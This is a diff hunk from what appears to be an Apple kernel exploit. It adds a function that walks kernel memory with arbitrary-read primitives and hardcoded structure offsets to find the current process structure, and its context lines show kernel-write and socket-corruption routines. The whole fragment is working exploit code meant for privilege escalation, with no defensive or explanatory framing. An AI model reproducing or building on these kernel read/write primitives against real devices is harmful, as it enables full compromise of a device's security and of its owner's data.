@@ -482,6 +482,43 @@ void early_kwrite64(uint64_t where, uint64_t what)
 	early_kwrite32bytes(where, writeBuf);
 }
 
+uint64_t find_self_proc(void)
+{
+    uint64_t control_socket_addr =
+        early_kread64(
+            controlSocketPcb + OFFSET_PCB_SOCKET
+        );
+
+    if (!control_socket_addr) {
+        return 0;
+    }
+
+    uint64_t self_thread =
+        early_kread64(
+            control_socket_addr + 0x2A8
+        );
+
+    if (!self_thread) {
+        return 0;
+    }
+
+    uint64_t self_thread_ro =
+        early_kread64(
+            self_thread + 0x368
+        );
+
+    if (!self_thread_ro) {
+        return 0;
+    }
+
+    uint64_t self_proc =
+        early_kread64(
+            self_thread_ro + 0x18
+        );
+
+    return self_proc;
+}
+
 int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)
 {
 	if (doRead) {
